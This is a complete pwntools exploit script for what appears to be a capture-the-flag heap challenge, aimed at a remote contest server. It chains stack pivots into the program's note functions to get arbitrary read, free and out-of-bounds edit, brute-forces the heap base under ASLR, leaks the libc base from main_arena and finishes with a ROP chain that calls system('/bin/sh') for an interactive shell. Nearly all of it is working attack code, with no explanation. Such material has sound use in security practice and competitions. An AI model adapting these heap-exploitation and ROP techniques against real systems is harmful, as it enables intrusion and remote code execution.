#!/usr/bin/python3
from pwn import *
from sys import argv

elf = context.binary = ELF('chal_patched')
context.log_level = 'debug'
context.terminal = 'kitty'

libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

# p = process()
# gdb.attach(p)
# p = remote('localhost', 8081)
p = remote('nc.asrctf.online', 21300)

option_raw = lambda b: p.sendafter(b'> ', b)
option = lambda i: option_raw(str(i).encode())
sendi_raw = lambda b: p.sendafter(b': ', b)
sendi = lambda i: sendi_raw(str(i).encode())
sendb = lambda b: p.sendafter(b': ', b)

def malloc(idx, content):
    option(1)
    sendi(idx)
    sendb(content)

def write(idx, content):
    option(2)
    sendi(idx)
    sendb(content)

def read(idx):
    option(3)
    sendi(idx)
    p.recvuntil(b'data: ')
    return p.recvline().strip()

def free(idx):
    option(4)
    sendi(idx)

for i in range(0x1f):
    malloc(0, b'a')
malloc(1, b'A'*0x20+b'ndgsghdj')

flag = 0
addrs = [0x404630, 0x404170]
heap = -1

def arbread(addr):
    global flag
    option_raw(flat({
        0x70: [
            addrs[flag]+0x70,
            elf.sym.read_ulong+8
        ]
    }).ljust(0x100, b'\0'))

    p.send(flat({
        0: str(addr).encode() + b'\0',
        0x70: [
            addrs[flag]+0x78+8,
            elf.sym.show_note+120,
            addrs[flag]+0x70,
            elf.sym.main+31
        ]
    }))

    flag = 1 - flag

    return p.recvline().strip()

if len(argv) > 1:
    if argv[1] == 'aslr':
        context.log_level = 'info'
        current = -1

        for i in range(0x10000000, 0x40000000, 0x10000):
            log.info(f'trying {hex(i)}')
            resp = arbread(i)

            if b'\0' in resp:
                log.info(f'found heap')
                current = i
                break

        found = False
        resp = b'\0'
        while not found and resp:
            resp = arbread(current)
            if b'ndgsghdj' in resp:
                log.info("found marker")
                break
            current -= 0x1000

        log.info("current, %#x", current)
        heap = current - 0x1000
        log.info("heap, %#x", heap)
        mangle = heap >> 12
else:
    heap = 0x0000000000405000

malloc(2, flat(
    0x100, heap+0x3e0
)) # dispatcher for arbfree

oob_addrs = [heap+0x6000, heap+0x7000]
oob_flag = 0
def edit_oob(idx, content):
    global oob_flag
    option_raw(flat({
        0x70: [
            oob_addrs[oob_flag]+0x70,
            elf.sym.read_ulong+8
        ]
    }).ljust(0x100, b'\0'))

    p.send(flat({
        0x70: [
            oob_addrs[oob_flag]+0x78+0x10,
            elf.sym.edit_note+39,
            idx,
            oob_addrs[oob_flag]+0x70,
            elf.sym.main+31
        ]
    }))
    
    sendb(content)
    oob_flag = 1 - oob_flag

def free_oob(idx):
    global oob_flag
    option_raw(flat({
        0x70: [
            oob_addrs[oob_flag]+0x70,
            elf.sym.read_ulong+8
        ]
    }).ljust(0x100, b'\0'))

    p.send(flat({
        0x70: [
            oob_addrs[oob_flag]+0x78+0x10,
            elf.sym.delete_note+39,
            idx,
            oob_addrs[oob_flag]+0x70,
            elf.sym.main+31
        ]
    }))
    
    oob_flag = 1 - oob_flag

edit_oob(0xda, flat(0, 0xb91))
write(2, flat(0x100, heap+0x3e0+0x10))
free_oob(0xda)

p.recvline()
libc.address = u64(p.recv(6)+b'\0'*2) - libc.sym.main_arena - 96
log.info("libc.address, %#x", libc.address)

rop = ROP(libc)
rop.system(next(libc.search(b'/bin/sh\0')))

p.send(flat({
    0x78: rop.chain()
}))

p.interactive()
